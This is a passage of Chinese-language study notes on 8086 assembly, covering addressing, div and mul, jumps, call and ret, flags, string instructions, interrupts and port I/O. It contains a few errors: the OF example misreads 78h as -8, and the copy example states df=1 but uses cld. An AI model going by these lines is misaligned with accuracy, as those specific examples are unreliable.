ends\nend start\n```\n\n# 8. 数据处理\n\nreg表示一个寄存器，sreg表示一个段寄存器。\n\nreg有ax, bx, cx, dx, ah, al, bh, bl, ch, cl, dh, dl, sp, bp, si, di\n\nsreg有ds, ss, cs, es\n\n## 8.1 bx, si, di和bp\n\n1. 在8086CPU中又有这4个寄存器可以在“[]”中进行内存单元寻址\n2. 在“[]”中，这4个寄存器可以单个出现，或只能以4种组合出现：bx和si, bx和di, bp和si, bp和di\n\n```asm\nmov ax,[bx]\nmov ax,[bx+si]\nmov ax,[bp+di]\n```\n\n3. 只要在“[]”中使用寄存器bp，而指令中没有显性地给出段地址，段地址就默认在ss中\n\n```asm\nmov ax,[bp]\t\t\t\t(ax)=((ss)*16+(bp))\nmov ax,[bp+si+idata]\t(ax)=((ss)*16+(bp)+(si)+idata)\n```\n\n## 8.2 数据的位置\n\n指令在执行前，所要处理的数据可以在3个地方：CPU内部、内存、端口。\n\n| 汇编指令   | 指令执行前数据的位置 |\n| ---------- | -------------------- |\n| mov bx,[0] | 内存，ds:0单元       |\n| mov bx,ax  | CPU内部，ax寄存器    |\n| mov bx,1   | CPU内部，指令缓冲器  |\n\n### 8.2.1 数据位置的表达\n\n1. 立即数(idata)\n2. 寄存器\n3. 段地址(SA)和偏移地址(EA)\n\n### 8.2.2 寻址方式\n\n{% asset_img 寻址方式小结.png 寻址方式 %}\n\n## 8.3 数据的长度\n\n8086CPU可以处理两种尺寸的数据，byte和word。\n\n1. 通过寄存器名指明要处理的数据的尺寸\n2. 在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或byte\n\n例如下面的指令中，用word ptr指明了指令访问的内存单元是一个字单元\n\n```asm\nmov word ptr ds:[0],1\ninc word ptr [bx]\n```\n\n下面的指令中，用byte ptr指明了指令访问的内存单元是一个字节单元\n\n```asm\nmov byte ptr ds:[0],1\nadd byte ptr [bx],2\n```\n\n3. 其他方法\n\n有些指令默认了访问的是字单元还是字节单元，比如push [1000H]就不用指明访问的是字单元还是字节单元。因为push指令只进行字操作。\n\n## 8.4 div指令\n\ndiv是除法指令，使用div做除法时应注意以下问题\n\n1. 除数：有8位和16位两种，在一个reg或内存单元中。\n2. 被除数：默认放在AX  或  DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。\n3. 结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。\n\n```asm\ndiv reg\ndiv 内存单元\n\ndiv byte ptr ds:[0]\n含义:(al)=(ax)/((ds)*16+0)的商\n\t(ah)=(ax)/((ds)*16+0)的余数\n\t\ndiv word ptr es:[0]\n含义:(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商\n\t(dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数\n```\n\n编程，利用除法指令计算100001/100\n\n被除数100001大于65535，不能用ax寄存器存放，所以只能用dx和ax两个寄存器联合存放100001，也就是说要进行16位的除法。除数100小于255，可以在一个8位寄存器中存放，但是因为被除数是32位的，除数应为16位，所以要用一个16位寄存器来存放除数100。\n\n因为要分别为dx和ax赋100001的高16位值和低16位值，所以应先将100001表示为16进制形式：186A1H\n\n```\nmov dx,1\nmov ax,86a1h\t\t;(dx)*10000H+(ax)=100001h\nmov bx,100\ndiv bx\n```\n\n程序执行后，(ax)=03E8H(即1000)，(dx)=1(余数为1)\n\n## 8.5 伪指令dd\n\ndd(double word)双字型数据\n\n用div计算data段中第一个数据除以第二个数据后的结果，商存在第三个数据的存储单元中。\n\n```asm\ndata segment\n\tdd 100001\n\tdw 100\n\tdw 0\ndata ends\ncode segment\n\tmov ax,data\n\tmov ds,ax\n\tmov ax,ds:[0]\t\t;ds:[0]字单元中的低16位存储在ax中\n\tmov dx,ds:[2]\t\t;ds:[2]字单元中的高16位存储在dx中\n\tdiv word ptr ds:[4]\t;用dx:ax中的32位数据除以ds:[4]字单元中的数据\n\tmov ds:[6],ax\t\t;将商存储在ds:[6]字单元中\ncode ends\n```\n\n## 8.6 dup\n\ndup是一个操作符，在汇编语言中同db, dw, dd等一样，也是由编译器识别处理的符号。它是和db, dw, dd等数据定义伪指令配合使用，用来进行数据的重复。\n\n```asm\ndb 3 dup (0)\t\t\t;定义了3个字节,它们的值都是0,相当于db 0,0,0\ndb 3 dup (0,1,2)\t\t;db 0,1,2,0,1,2,0,1,2\ndb 3 dup ('abc','ABC')\n```\n\ndup使用格式\n\n```asm\ndb 重复的次数 dup (重复的字节型数据)\ndw 重复的次数 dup (重复的字型数据)\ndd 重复的次数 dup (重复的双字型数据)\n```\n\n# 9. 转移指令的原理\n\n可以修改IP，或同时修改CS和IP的指令统称为转移指令。转移指令就是可以控制CPU执行内存中某处代码的指令。\n\n8086CPU的转移行为有以下几类\n\n- 只修改IP时，称为段内转移，比如：jmp ax\n- 同时修改CS和IP时，称为段间转移，比如：jmp 1000:0\n\n由于转移指令对IP的修改范围不同，段内转移又分为短转移和近转移\n\n- 短转移IP的修改范围为-128~127\n- 近转移IP的修改范围为-32768~32767\n\n8086CPU的转移指令分为以下几类\n\n- 无条件转移指令(jmp)\n- 条件转移指令\n- 循环指令(loop)\n- 过程\n- 中断\n\n## 9.1 操作符offset\n\n操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。\n\n```asm\nassume cs:codesg\ncodesg segment\nstart:\tmov ax,offset start\t\t;相当于mov ax,0(指令长度为3字节)\n\ts:\tmov ax,offset s\t\t\t;相当于mov ax,3\ncodesg ends\nend start\n```\n\n程序在运行中将s处的一条指令复制到s0处\n\n```asm\nassume cd:codesg\ncodesg segment\ns:\tmov ax,bx\t\t\t;mov ax,bx的机器码占两个字节\n\tmov si,offset s\n\tmov di,offset s0\n\tmov ax,cs:[si]\n\tmov cs:[di],ax\ns0:\tnop\t\t\t\t\t;nop机器码占一个字节\n\tnop\ncodesg ends\nend s\n```\n\n## 9.2 jmp指令\n\njmp为无条件转移指令，可以指修改IP，也可以同时修改CS和IP。\n\njmp指令要给出两种信息：\n\n1. 转移的目的地址\n2. 转移的距离(段间转移、段内短转移、段内近转移)\n\n### 9.2.1 依据位移进行转移的jmp指令\n\n```\njmp short 标号(转到标号处执行指令)：(IP)=(IP)+8位位移\n```\n\n这种格式的jmp指令实现的是段内短转移，它对IP的修改范围为-128~127，向前转移时最多可以越过128个字节，向后转移最多可以越过127个字节。\n\nCPU在执行jmp指令的时候并不需要转移的目的地址。\n\n```asm\nassume cs:codesg\ncodesg segment\nstart:\tmov ax,0\n\t\tjmp short s\n\t\tadd ax,1\n\ts:\tinc ax\ncodesg ends\nend start\n```\n\n```\njmp near ptr 标号：(IP)=(IP)+16位位移\n```\n\n这种格式的jmp指令实现的是段内近转移，它对IP的修改范围为-32768~32767，向前转移时最多可以越过32768个字节，向后转移最多可以越过32767个字节。\n\n### 9.2.2 转移的目的地址在指令中的jmp指令\n\n```\njmp far ptr 标号：(CS)=标号所在段的段地址；(IP)=标号在段中的偏移地址\n```\n\n这种格式的jmp指令实现的是段间转移，又称远转移。far ptr指明了指令用标号的段地址和偏移地址修改CS和IP。\n\n```asm\nassume cs:codesg\ncodesg segment\nstart:\tmov ax,0\n\t\tmov bx,0\n\t\tjmp far ptr s\n\t\tdb 256 dup (0)\n\ts:\tadd ax,1\n\t\tinc ax\ncodesg ends\nend start\n```\n\n### 9.2.3 转移地址在寄存器中的 jmp指令\n\n```\njmp 16位reg：(IP)=(16位reg)\n```\n\n### 9.2.4 转移地址在内存中的jmp指令\n\n转移地址在内存中的jmp指令有两种格式：\n\n1. jmp word ptr 内存单元地址(段内转移)\n\n功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址。\n\n```asm\nmov ax,0123h\nmov ds:[0],ax\njmp word ptr ds:[0]\n```\n\n执行后，(IP)=0123H\n\n2. jmp dword ptr 内存单元地址(段间转移)\n\n功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址。\n\n(CS)=(内存单元地址+2)，(IP)=(内存单元地址)\n\n```asm\nmov ax,0123h\nmov ds:[0],ax\nmov word ptr ds:[2],0\njmp dword ptr ds:[0]\n```\n\n执行后，(CS)=0，(IP)=0123h，CS:IP指向0000:0123\n\n## 9.3 jcxz指令\n\njcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127\n\n```\njcxz 标号(如果(cx)=0,转移到标号处执行)：当(cx)=0时，(IP)=(IP)+8位位移\nif((cx)==0) jmp short 标号;\n```\n\n## 9.4 loop指令\n\nloop指令是循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127\n\n```\nloop 标号((cx)=(cx)-1,如果(cx)≠0，转移到标号处执行)：如果(cx)≠0,(IP)=(IP)+8位位移\n(cx)--;\nif((cx)!=0) jmp short 标号;\n```\n\n# 10. call和ret指令\n\ncall和ret指令都是转移指令，他们都修改IP，或同时修改CS和IP。它们经常被共同用来实现子程序的设计。\n\n## 10.1 ret和retf\n\nret指令用栈中的数据，修改IP的内容，从而实现近转移；retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。\n\n### 10.1.1 ret指令\n\nCPU执行ret指令时，进行下面2步操作：\n\n1. (IP)=((SS)*16+(SP))\n2. (SP)=(SP)+2\n\nCPU执行ret指令时相当于进行：\n\n```asm\npop IP\n```\n\n### 10.1.2 retf指令\n\nCPU执行retf指令时，进行下面4步操作：\n\n1. (IP)=((SS)*16+(SP))\n2. (SP)=(SP)+2\n3. (CS)=((SS)*16+(SP))\n4. (SP)=(SP)+2\n\nCPU执行retf指令时相当于进行：\n\n```asm\npop IP\npop CS\n```\n\n## 10.2 call指令\n\nCPU执行call指令时，进行2步操作：\n\n1. 将当前的IP或CS和IP压入栈中\n2. 转移\n\ncall指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。\n\n### 10.2.1 依据位移进行转移的call指令\n\n```asm\ncall 标号(将当前的IP压栈后，转到标号处执行指令)\n```\n\nCPU执行此种格式的call指令时，进行如下操作：\n\n1. (sp)=(sp)-2\n   ((ss)*16+(sp))=(IP)\n2. (IP)=(IP)+16位位移\n\nCPU执行“call 标号“时，相当于进行：\n\n```asm\npush IP\njmp near ptr 标号\n```\n\n### 10.2.2 转移的目的地址在指令中的call指令\n\n```asm\ncall far ptr 标号\n```\n\n实现的是段间转移。\n\nCPU执行此种格式的call指令时，进行如下操作：\n\n1. (sp)=(sp)-2\n\n   ((ss)*16+(sp))=(CS)\n\n   (sp)=(sp)-2\n\n   ((ss)*16+(sp))=(IP)\n\n2. (CS)=标号所在段的段地址\n\n   (IP)=标号在段中的偏移地址\n\nCPU执行“call far ptr 标号“时，相当于进行：\n\n```asm\npush CS\npush IP\njmp far ptr 标号\n```\n\n### 10.2.3 转移地址在寄存器中的call指令\n\n```asm\ncall 16位reg\n```\n\nCPU执行此种格式的call指令时，进行如下操作：\n\n```asm\n(sp)=(sp)-2\n((ss)*16+(sp))=(IP)\n(IP)=(16位reg)\n```\n\nCPU执行“call 16位reg“时，相当于进行：\n\n```asm\npush IP\njmp 16位reg\n```\n\n### 10.2.4 转移地址在内存中的call指令\n\n转移地址在内存中的call指令有两种格式：\n\n1. call word ptr 内存单元地址\n\nCPU执行“call word ptr 内存单元地址“时，相当于进行：\n\n```asm\npush IP\njmp word ptr 内存单元地址\n```\n\n```asm\nmov sp,10h\nmov ax,0123h\nmov ds:[0],ax\ncall word ptr ds:[0]\n```\n\n执行后，(IP)=0123h，(sp)=0EH\n\n2. call dword ptr 内存单元地址\n\nCPU执行“call dword ptr 内存单元地址“时，相当于进行：\n\n```asm\npush CS\npush IP\njmp dword ptr 内存单元地址\n```\n\n```asm\nmov sp,10h\nmov ax,0123h\nmov ds:[0],ax\nmov word ptr ds:[2],0\ncall dword ptr ds:[0]\n```\n\n执行后，(CS)=0，(IP)=0123H，(sp)=0CH\n\n## 10.3 call和ret的配合使用\n\n```asm\nassume cd:code\ncode segment\nstart:\tmov ax,1\n\t\tmov cx,3\n\t\tcall s\n\t\tmov bx,ax\t\t;(bx)=8\n\t\tmov ax,4c00h\n\t\tint 21h\n\ts:\tadd ax,ax\n\t\tloop s\n\t\tret\ncode ends\nend start\n```\n\n## 10.4 mul指令\n\nmul指令是乘法指令，使用mul做乘法时要注意两点：\n\n1. 两个相乘的数：要么都是8位，要么都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中；如果是16位，一个默认放在AX中，另一个放在16位reg或内存字单元中\n2. 结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认在DX中存放，低位在AX中存放\n\n```asm\nmul reg\nmul 内存单元\n\nmul byte ptr ds:[0]\n含义：(ax)=(al)*((ds)*16+0)\n\nmul word ptr [bx+si+8]\n含义：(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位\n\t (dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的高16位\n```\n\n计算100*10。(100和10小于255，可以做8位乘法)\n\n```asm\nmov al,100\nmov bl,10\nmul bl\n```\n\n结果：(ax)=1000(03E8H)\n\n计算100*10000。(100小于255，但10000大于255，所以必须做16位乘法)\n\n```asm\nmov ax,100\nmov bx,10000\t\nmul bx\n```\n\n结果：(ax)=4240h，(dx)=000FH（F4240H=1000000）\n\n# 11. 标志寄存器\n\n标志寄存器作用：\n\n1. 用来存储相关指令的某些执行结果\n2. 用来为CPU执行相关指令提供行为依据\n3. 用来控制CPU的相关工作方式\n\nflag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息。\n\n| 15   | 14   | 13   | 12   | 11   | 10   | 9    | 8    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n|      |      |      |      | OF   | DF   | IF   | TF   | SF   | ZF   |      | AF   |      | PF   |      | CF   |\n\n8086中flag寄存器只有标注的这些位有特殊的含义，其它8086CPU没有使用。\n\n## 11.1 ZF标志\n\nflag的第6位是ZF，零标志位。它记录相关指令执行后，其结果是否为0。如果为0，ZF=1；否则ZF=0。\n\n```asm\nmov ax,1\nsub ax,1\n```\n\n执行后，(ax)=0，ZF=1\n\n## 11.2 PF标志\n\nflag的第2位是PF，奇偶标志位。它记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。如果1的个数为偶数，PF=1；否则PF=0。\n\n```asm\nmov al,1\nadd al,10\n```\n\n执行后，结果为11=00001011B，其中有3个1，PF=0\n\n## 11.3 SF标志\n\nflag的第7位是SF，符号标志位。它记录相关指令执行后，其结果是否为负。如果结果为负，SF=1；否则SF=0。\n\n```asm\nmov al,10000001B\t\t;al=-127\nadd al,1\n```\n\n结果：(al)=10000010B，SF=1\n\n## 11.4 CF标志\n\nflag的第0位是CF，进位标志位。一般情况下，在进行**无符号数运算**时，它记录了运算结果的最高有效位向更高位的进位值，或从更高位借位。\n\n|              | 7          | 6    | 5    | 4    | 3    | 2    | 1    | 0    |\n| ------------ | ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n|              | 0          | 0    | 0    | 1    | 1    | 1    | 0    | 0    |\n| 假想的更高位 | 最高有效位 |      |      |      |      |      |      |      |\n\n当两数相加时，有可能产生从最高有效位向更高位的进位。CPU在运算的时候，并不丢弃这个进位值，而是记录在一个特殊的寄存器的某一位上。8086CPU就用flag的CF位来记录这个进位值。\n\n```asm\nmov al,98H\nadd al,al\t\t;98h+98h=130h=0001 0011 0000B\n```\n\n执行后，(al)=30H，CF=1，CF记录了从最高有效位向更高位的进位值。\n\n## 11.5 OF标志\n\nflag的第11位是OF，溢出标志位。一般情况下，OF记录了**有符号数运算**的结果是否发生了溢出。如果发生溢出，OF=1；否则OF=0。\n\n对于8位的有符号数据，机器所能表示的范围就是-128\\~127；对于16位的有符号数据，机器所能表示的范围是-32768\\~32767。\n\n```asm\nmov al,0F0H\t\t;0f0h=240=-16\t240-128*2=-16\nadd al,78H\t\t;78h=120=-8\n```\n\n执行后，对于无符号运算，0F0H+78H=168H=0001 0110 1000B，CF=1；对于有符号数，-16-8=-24，OF=0。\n\n## 11.6 adc指令\n\nadc是带进位加法指令，它利用了CF位上记录的进位值。\n\n```asm\nadc 操作对象1,操作对象2\n```\n\n操作对象1=操作对象1+操作对象2+CF\n\n```asm\nmov ax,2\t\t;(ax)=2\nmov bx,1\t\t;(bx)=1\nsub bx,ax\t\t;(bx)=-1=FFFFH\t\tCF=1\nadc ax,1\t\t;(ax)=(ax)+1+CF=4\n```\n\n## 11.7 sbb指令\n\nsbb是带借位减法指令，它利用了CF位上记录的借位值。\n\n```asm\nsbb 操作对象1,操作对象2\n```\n\n操作对象1=操作对象1-操作对象2-CF\n\n```asm\nmov bx,1000H\t\t;(bx)=1000h\nmov ax,003EH\t\t;(ax)=003eh\nsub bx,2000H\t\t;(bx)=1000h-2000h=F000H\t\tCF=1\nsbb ax,0020H\t\t;(ax)=(ax)-20h-1=1D\n```\n\n## 11.8 cmp指令\n\ncmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。\n\n```asm\ncmp 操作对象1,操作对象2\n```\n\n计算操作对象1-操作对象2但并不保存结果，仅仅根据计算结果对标志寄存器进行设置。\n\n```asm\nmov ax,8\t\t;(ax)=8\nmov bx,3\t\t;(bx)=3\ncmp ax,bx\t\t;(ax)-(bx)=5=0101b\n```\n\n指令执行后，零标志位ZF=0，奇偶标志位PF=1，符号标志位SF=0，进位标志位CF=0，溢出标志位OF=0\n\n如果因为溢出导致了实际结果为负，那么逻辑上真正的结果必然为正；反之亦然。\n\n## 11.9 检测比较结果的条件转移指令\n\n除了jcxz指令外，CPU还提供了其他条件转移指令，大多数条件转移指令都检测标志寄存器的相关标志位，根据检测结果来决定是否修改IP。这些条件转移指令通常和cmp相配合使用，类似call和ret配合。\n\n因为cmp指令可以同时进行两种比较，无符号数比较和有符号数比较，所以根据cmp指令的比较结果进行转移的指令也分为两种，即根据无符号数的比较结果进行转移的条件转移指令(它们检测ZF、CF的值)和根据有符号数的比较结果进行转移的条件转移指令(SF、OF、ZF)。\n\n常用的根据无符号数的比较结果进行转移的条件转移指令\n\n| 指令 | 全称           | 含义         | 检测的相关标志位 |\n| ---- | -------------- | ------------ | ---------------- |\n| je   | jump equal     | 等于则转移   | zf=1             |\n| jne  | jump not equal | 不等于则转移 | zf=0             |\n| jb   | jump below     | 低于则转移   | cf=1             |\n| jnb  | jmp not below  | 不低于则转移 | cf=0             |\n| ja   | jump above     | 高于则转移   | cf=0且zf=0       |\n| jna  | jump not above | 不高于则转移 | cf=1或zf=1       |\n| jz   | jump zero      | 零则转移     | zf=1             |\n| jnz  | jump not zero  | 非零则转移   | zf=0             |\n\n编程统计data段中数值为8的字节的个数，用ax保存统计结果。\n\n```asm\ndata segment\n\tdb 8,11,8,1,8,5,63,38\ndata ends\ncode segment\n\t\tmov ax,data\n\t\tmov ds,ax\n\t\tmov bx,0\t\t\t;ds:bx指向第一个字节\n\t\tmov ax,0\t\t\t;初始化累加器\n\t\tmov cx,8\ns:\t\tcmp byte ptr [bx],8\t;和8进行比较\n\t\tjne next\t\t\t;如果不相等则转到next，继续循环\n\t\tinc ax\t\t\t\t;如果相等将计数加1\nnext:\tinc bx\n\t\tloop s\t\t\t\t;程序执行后(ax)=3\ncode ends\n```\n\n## 11.10 DF标志和串传送指令\n\nflag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si、di的增减。\n\ndf=0\t每次操作后si、di递增；\n\ndf=1\t每次操作后si、di递减。\n\n### 11.10.1 串传送指令\n\n```asm\nmovsb\n```\n\n执行movsb指令相当于进行下面操作：\n\n1. ((es)*16+(di))=((ds)\\*16+(si))\n\n2. 如果df=0则 (si)=(si)+1;(di)=(di)+1\n\n   如果df=1则 (si)=(si)-1;(di)=(di)-1\n\nmovsb的功能是将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器df的值，将si和递增或递减。\n\n```asm\nmovsw\n```\n\nmovsw的功能是将ds:si指向的内存字单元中的字送入es:di中，然后根据标志寄存器df的值，将si和递增2或递减2。\n\nmovsb和movsw进行的是串传送操作的一个步骤，一般来说，movsb和movsw都和rep配合使用\n\n```asm\nrep movsb\n```\n\n用汇编语法来描述就是\n\n```asm\ns:\tmovsb\n\tloop s\n```\n\nrep的作用是根据cx的值，重复执行后面的串传送指令。由于每执行一次movsb指令si和di都会递增或递减后一个或前一个单元，则rep movsb就可以循环实现(cx)个字符的传送。\n\n由于df位决定着串传送指令执行后si和di改变的方向，所以CPU应该提供相应的指令来对df位进行设置，从而使人能够决定传送的方向。\n\n8086CPU提供下面两条指令对df位进行设置\n\n```asm\ncld指令:将标志寄存器的df位置0\nstd指令:将标志寄存器的df位置1\n```\n\n编程，用串传送指令，将data段中的第一个字符串复制到它后面的空间中。\n\n```asm\ndata segment\n\tdb 'Welcome to masm!'\n\tdb 16 dup (0)\ndata ends\n```\n\n①传送的原始位置：ds:si\tdata:0\n\n②传送的目的位置：es:di\tdata:10h\n\n③传送的长度：cx\t\t\t\t(cx)=16\n\n④传送的方向：df\t\t\t\tdf=1\n\n```asm\nmov ax,data\nmov ds,ax\nmov si,0\t\t\t;ds:si指向data:0\nmov es,ax\nmov di,16\t\t\t;es:di指向data:0010\nmov cx,16\ncld\t\t\t\t\t;df=0,正向传送\nrep movsb\n```\n\n## 11.11 pushf和popf\n\npushf的功能是将标志寄存器的值压栈，popf是从栈中弹出数据，送入标志寄存器中。\n\n# 12. 内中断\n\n任何一个通用的CPU，可以在执行完当前正在执行的指令之后，检测到从CPU外部发送过来或内部产生的一种特殊信息，并且可以立即对所接收到的信息进行处理。中断的意思是CPU不再接着(刚执行完的指令)向下执行，而是转去处理这个特殊信息。\n\n对于8086CPU，当内部有下面的情况发生的时候将产生相应的中断信息：\n\n1. 除法错误，比如执行div指令产生的除法溢出\t0\n2. 单步执行                                                               1\n3. 执行into指令                                                        4\n4. 执行int指令，该指令的格式为int n，指令中的n为字节型立即数，是提供给CPU的中断类型码\n\n## 12.1 中断处理程序\n\nCPU收到中断信息后，应该转去执行该中断信息的处理程序。中断信息中包含有标识中断源的类型码，根据CPU的设计，中断类型码的作用就是用来定位中断处理程序。CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址。中断向量表在0000:0000~0000:03FF的1024个单元存放着。在中断向量表中，一个表项占两个字，高地址字存放段地址，低地址字存放偏移地址。\n\n## 12.2 中断过程\n\n用中断类型码找到中断向量，并用它设置CS和IP，这个工作是由CPU的硬件自动完成的。CPU硬件完成这个工作的过程被称为中断过程。\n\n中断过程：\n\n1. (从中断信息中)取得中断类型码N\n2. 标志寄存器的值入栈(因为在中断过程中要改变标志寄存器的值，所以先将其保存在栈中)  pushf\n3. 设置标志寄存器的第8位TF和第9位IF为0  TF=0，IF=0\n4. CS的内容入栈   push CS\n5. IP的内容入栈    push IP\n6. 从内存地址为中断类型码*4 和中断类型码\\*4+2 的两个字单元中读取中断处理程序的入口地址设置IP和CS   (IP)=(N\\*4)，(CS)=(N\\*4+2)\n\n## 12.3 中断处理程序和iret指令\n\n中断处理程序的编写步骤：\n\n1. 保存用到的寄存器\n2. 处理中断\n3. 恢复用到的寄存器\n4. 用iret指令返回\n\niret指令的功能用汇编语法描述：\n\n```asm\npop IP\npop CS\npopf\n```\n\niret指令执行后，CPU回到执行中断处理程序前的执行点继续执行程序。\n\n## 12.4 单步中断\n\nCPU在执行完一条指令后，如果检测到标志寄存器的TF=1，则产生单步中断，引发中断过程。\n\n# 13. int指令\n\nint n也是内中断的一种。\n\n## 13.1 BIOS中断例程\n\nint 10h中断例程是BIOS提供的中断例程，其中包含了多个和屏幕输出相关的子程序。\n\n(ah)=2表示调用第10h号中断例程的2号子程序，功能为设置光标位置。\n\n(ah)=9表示调用第10h号中断例程的9号子程序，功能为在光标位置显示字符，可以提供要显示的字符、颜色属性、页号、字符重复个数作为参数。\n\nbl中的颜色属性的格式如下：\n\n| 7    | 6    | 5       | 4    | 3    | 2    | 1       | 0    |\n| ---- | ---- | ------- | ---- | ---- | ---- | ------- | ---- |\n| BL   | R    | G       | B    | I    | R    | G       | B    |\n| 闪烁 |      | 4~6背景 |      | 高亮 |      | 0~2前景 |      |\n\n编程，在屏幕的5行12列显示3个红底高亮闪烁绿色的'a'。\n\n```asm\nassume cs:code\ncode segment\n\tmov ah,2\t\t\t\t;置光标\n\tmov bh,0\t\t\t\t;第0页\n\tmov dh,5\t\t\t\t;dh中放行号\n\tmov dl,12\t\t\t\t;dl中放列号\n\tint 10h\n\t\n\tmov ah,9\t\t\t\t;在光标位置显示字符\n\tmov al,'a'\t\t\t\t;字符\n\tmov bl,11001010b\t\t;颜色属性\n\tmov bh,0\t\t\t\t;第0页\n\tmov cx,3\t\t\t\t;字符重复个数\n\tint 10h\n\t\n\tmov ax,4c00h\n\tint 21h\ncode ends\nend\n```\n\n## 13.2 DOS中断例程\n\nint 21h中断例程是DOS提供的中断例程，其中包含了DOS提供给程序员在编程时调用的子程序。\n\n前面一直使用的是int 21h中断例程的4ch号功能，即程序返回功能\n\n```asm\nmov ah,4ch\t\t;程序返回\nmov al,0\t\t;返回值\nint 21h\n```\n\n(ah)=9表示调用第21h号中断例程的9号子程序，功能为在光标位置显示字符串，可以提供要显示字符串的地址作为参数。\n\n编程，在屏幕的5行12列显示字符串“Welcome to masm!”\n\n```asm\nassume cs:code,ds:data\ndata segment\n\tdb 'Welcome to masm!'\ndata ends\ncode segment\nstart:\tmov ah,2\t\t\t\t;置光标\n\t\tmov bh,0\t\t\t\t;第0页\n\t\tmov dh,5\t\t\t\t;dh中放行号\n\t\tmov dl,12\t\t\t\t;dl中放列号\n\t\tint 10h\n\t\t\n\t\tmov ax,data\n\t\tmov ds,ax\n\t\tmov dx,0\t\t\t\t;ds:dx指向字符串的首地址data:0\n\t\tmov ah,9\n\t\tint 21h\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncode ends\nend start\n```\n\n# 14. 端口\n\n在PC机系统中，和CPU通过总线相连的芯片除各种存储器外，还有以下三种芯片\n\n1. 各种接口卡(网卡、显卡)上的接口芯片，它们控制接口卡进行工作\n2. 主板上的接口芯片，CPU通过它们对部分外设进行访问\n3. 其他芯片，用来存储相关的系统信息，或进行相关的出入输出处理\n\n从CPU的角度，将寄存器都当作端口，对它们进行统一编址，从而建立了一个统一的端口地址空间。每一个端口在地址空间中都有一个地址。\n\nCPU可以直接读写以下3个地方的数据：\n\n1. CPU内部的寄存器\n2. 内存单元\n3. 端口\n\n## 14.1 端口的读写\n\n因为端口所在的芯片和CPU通过总线相连，所以端口地址和内存地址一样，通过地址总线来传送。在PC系统中，CPU最多可以定位64KB个不同的端口，端口地址的范围为0~65535\n\n端口的读写指令只有两条：in和out，分别用于从端口读取数据和往端口写入数据。\n\n**访问内存：**\n\n```asm\nmov ax,ds:[8]\t\t\t\t;假设执行前(ds)=0\n```\n\n①CPU通过地址线将地址信息8发出\n\n②CPU通过控制线发出内存读命令，选中存储器芯片并通知它将要从中读取数据\n\n③存储器将8号单元中的数据通过数据线送入CPU\n\n**访问端口：**\n\n```asm\nin al,60h\t\t\t\t\t;从60h号端口读入一个字节\n```\n\n①CPU通过地址线将地址信息60h发出\n\n②CPU通过控制线发出端口读命令，选中端口所在的芯片，并通知它将要从中读取数据\n\n③端口所在的芯片将60h端口中的数据通过数据线送入CPU\n\n注：在in和out指令中，只能使用ax或al来存放从端口中读入的数据或要发送到端口中的数据。访问8位端口时用al，访问16位时用ax。\n\n对0~255以内的端口进行读写时：\n\n```asm\nin al,20h\t\t\t\t;从20h端口读入一个字节\nout 20h,al\t\t\t\t;往20h端口写入一个字节\n```\n\n对256~65535的端口进行读写时，端口号放在dx中：\n\n```asm\nmov dx,3f8h\t\t\t\t;将端口号3f8h送入dx\nin al,dx\t\t\t\t;从3f8h端口读入一个字节\nout dx,al\t\t\t\t;往3f8h端口写入一个字节\n```\n\n## 14.2 shl和shr指令\n\nshl和shr是逻辑移位指令。\n\nshl是逻辑左移指令，它的功能为：\n\n- 将一个寄存器或内存单元中的数据向左移位\n- 将最后移出的一位写入CF中\n- 最低位用0补充\n\n```asm\nmov al,01001000b\nshl al,1\t\t\t\t\t;将al中的数据左移一位\n```\n\n执行后(al)=10010000b，CF=0\n\nshr是逻辑右移指令：\n\n- 将一个寄存器或内存单元中的数据向右移位\n- 将最后移出的一位写入CF中\n- 最高位用0补充\n\n```asm\nmov al,10000001b\nshr al,1\n```\n\n执行后(al)=01000000b，CF=1\n\n## 14.3 CMOS RAM芯片\n\nCMOS特征：\n\n1. 包含一个实时钟和一个有128个存储单元的RAM存储器\n2. 该芯片靠电池供电，关机后其内部的实时钟仍可正常工作，RAM中的信息不丢失\n3. 128个字节的RAM中，内部实时钟占用0~0dh单元来保存时间信息，其余大部分单元用于保存系统配置信息，供系统启动时BIOS程序读取。\n4. 芯片内部有两个端口，端口地址为70h和71h。CPU通过这两个端口读写CMOS\n5. 70h为地址端口，存放要访问的CMOS 